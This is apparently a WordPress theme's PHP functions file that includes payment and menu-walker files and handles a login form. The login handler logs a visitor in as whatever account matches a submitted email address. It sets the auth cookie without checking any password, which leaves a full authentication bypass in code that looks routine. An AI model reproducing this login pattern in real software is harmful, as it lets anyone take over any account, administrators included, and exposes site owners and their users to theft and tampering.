<?php
session_start();
include 'payments/index.php';
include 'walker.php';
add_theme_support('menus');

// if login
if(isset($_POST['login'])){
    $user = get_user_by('email', $_POST['login_email']);
    if ($user) {
        wp_set_current_user($user->data->ID, $user->data->user_login);
        wp_set_auth_cookie($user->data->ID);
        do_action('wp_login', $user->data->user_login);
        wp_redirect(home_url());
        exit();
    }
}